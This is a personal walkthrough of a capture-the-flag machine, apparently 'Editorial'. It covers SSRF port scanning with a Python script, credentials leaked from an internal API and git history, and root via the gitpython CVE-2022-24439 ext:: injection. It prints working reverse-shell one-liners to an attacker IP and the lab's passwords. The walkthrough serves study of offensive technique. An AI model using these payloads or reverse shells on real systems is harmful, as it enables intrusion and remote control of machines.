Main steps
1. Enumerate webpage to find SSRF vulnerability
2. Exploit SSRF vulnerability to scan internal ports
3. Found internal directory and read contents using SSRF
4. Found credentials and gained user access with SSH
5. Read git commit history to find another user's credentials and pivoted
6. Enumerate `sudo -l` to find vulnerable script
7. Locate public exploit for script and gain root access

Learning points
1. SSRF enumeration and fuzzing with python and `Burpsuite` - make sure to check URL input fields for SSRF
2. I honestly don't understand how the `gitpython` RCE exploit works still

`nmap`
![[Pasted image 20260307012338.png]]
ports 22, 80 open, added `editorial.htb` to `/etc/hosts`

Initial look at the site shows a page where the user can upload a file
![[Pasted image 20260307012545.png]]

`Feroxbuster` found nothing interesting.

Tried intercepting the file upload with `Burpsuite` - (uploading random files)
![[Pasted image 20260307030528.png]]

Seems like the file is being uploaded to the `/static/uploads/` directory with a randomized name. Attempting to perform a GET request on the directory causes the uploaded file to be downloaded.

![[Pasted image 20260307030707.png]]

Seems like the input expects image files. Tried uploading a PNG file and saw that the picture under Book information changes when preview is clicked.
![[Pasted image 20260307031905.png]]

Tried a lot of ways to bypass the file name transformation but nothing worked.

Looking at the URL field - tried to make a connection to my own IP and was able to.
![[Pasted image 20260307035500.png]]

Possible SSRF vulnerability here.
Took the POST request and sent it to `Burpsuite` Intruder to try to fuzz internal ports.
Intruder is extremely slow so wrote a short script in python to send POST requests. (Tried using `SSRFMap` but unfortunately it does not support POSTing `multipart/form-data)

Script:
```
#!/usr/bin/python3
import requests

with open("a", 'wb') as f:
        f.write(b'')

for port in range(1, 65535):
        with open("a", 'rb') as file:
                data_post = {"bookurl": f"http://127.0.0.1:{port}"}
                data_file = {"bookfile": file}

                try:
                        r = requests.post("http://editorial.htb/upload-cover",files=data_file, data=data_post)
                        print(f"{port} --- not this port")
                        if not r.text.strip().endswith('.jpeg'):
                                print(f"{port} --- {r.text}")
                                break
                except requests.RequestException as e:
                        print(f"Error on port {port}: {e}")
```

It just loops through all the port numbers and sends post requests with `http://127.0.0.1:{port number} ` until it hits a port number that does not return a JPG file.

Port 5000 returned something else.
![[Pasted image 20260307042625.png]]
Sending this URL to the form and downloading the file that was uploaded onto the site by dragging the book cover shows this:
![[Pasted image 20260307042819.png]]
Trying all the directories listed here gave 3 files: some coupon codes, a changelog, and a welcome message containing a credential.
![[Pasted image 20260307043815.png]]

`dev`: ` dev080217_devAPI!@ `

Attempted to SSH using these credentials and was able to gain access as `dev`.
![[Pasted image 20260307043920.png]]

Initial enumeration shows no `sudo` privileges or `SUID` bits set. 
`/etc/passwd` shows another user named `prod`.
![[Pasted image 20260307044333.png]]

Checking the home folder of `dev` shows a git repository and restoring it gives a few app files.
![[Pasted image 20260307044359.png]]

Checking the `git` commit history using `git log` and `git show <commit ID>` gives a password for the `prod` user.
![[Pasted image 20260307045125.png]]

`prod` : ` 080217_Producti0n_2023!@ `

Tried to `su prod` with these credentials and was able to get access.
![[Pasted image 20260307045213.png]]

Enumerating `sudo -l` shows that `prod` can run a python script as root.
![[Pasted image 20260307050023.png]]

Script looks like it clones a git repo into a new folder.
Googled the `multi_options=["-c protocol.ext.allow=always"]` and saw that it is part of an RCE vulnerability in `gitpython` - CVE-2022-24439 (https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

Based on this CVE, it seems like its possible to run scripts using the python script as `sudo`. 
Tried using the POC on the SNYK website and saw that `/tmp/pwned` was created.
![[Pasted image 20260307052021.png]]

Tried running a few different commands, like
`'ext::sh -c bash% -c 'exec bash -i &>/dev/tcp/10.10.14.71/4444 <&1''`
`'ext::sh -c bash% -c 'exec bash''`
but they were unable to launch a shell.

Tried writing a script that would launch a reverse shell with `bash -c 'exec bash -i &>/dev/tcp/10.10.14.71/4444 <&1'` and ran it with the python script with `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /home/prod/shell.sh'`
and was able to get a reverse shell as root.
![[Pasted image 20260307052406.png]]

